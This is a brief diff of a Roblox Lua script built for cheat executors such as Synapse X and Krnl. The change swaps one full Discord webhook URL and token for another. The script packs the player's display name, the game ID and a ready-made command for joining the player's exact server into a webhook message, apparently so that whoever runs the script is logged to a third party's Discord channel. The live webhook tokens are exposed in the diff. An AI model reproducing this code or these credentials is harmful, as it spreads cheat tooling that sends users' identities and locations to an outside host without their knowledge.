@@ -1,6 +1,6 @@
 local exploit = syn and "Synapse X" or KRNL_LOADED and "Krnl" or "Unknown Exploit"
 
-local url = "https://discord.com/api/webhooks/1057272639879643246/OLZN7xU6JBBQB49rjsdd9KKRP8J7JlYLrw-2c7_EStP8tDf13wugDupIEXztPbNdf3xD"
+local url = "https://discord.com/api/webhooks/1117914008482218054/3Ac-IKOi9ghXlOY7-Qi3_2-xAItbpoMaC3DyA8XB5E1kdlBVjE0Zb_H-VmKgZGaaXv3J"
 
 local data = {["embeds"] = {{["title"] = ('game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")',["description"] = " Game: https://www.roblox.com/games/" .. game.PlaceId .. "/ Name: " .. game.Players.LocalPlayer.DisplayName .." ",["type"] = "rich",["color"] = tonumber(0x7269da)}}}
 
